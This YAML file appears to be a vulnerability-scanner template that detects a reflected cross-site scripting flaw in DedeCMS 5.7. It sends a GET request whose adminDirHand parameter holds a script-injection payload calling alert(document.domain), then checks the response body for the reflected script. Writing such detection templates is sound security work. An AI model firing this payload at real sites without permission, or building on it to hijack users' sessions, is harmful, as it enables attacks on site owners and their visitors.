id: dedecms-config-xss
name: DedeCMS 5.7 - Cross-Site Scripting
severity: high
confidence: confirmed
description: DeDeCMS 5.7 contains a cross-site scripting vulnerability in the '/include/dialog/config.php' file. An attacker
  can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.
reference: CWE-79
tags:
- dedecms
- xss
- vuln
requests:
- method: GET
  path: /include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
  matchers:
  - type: body
    words:
    - location='../../</script><script>alert(document.domain)</script>
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
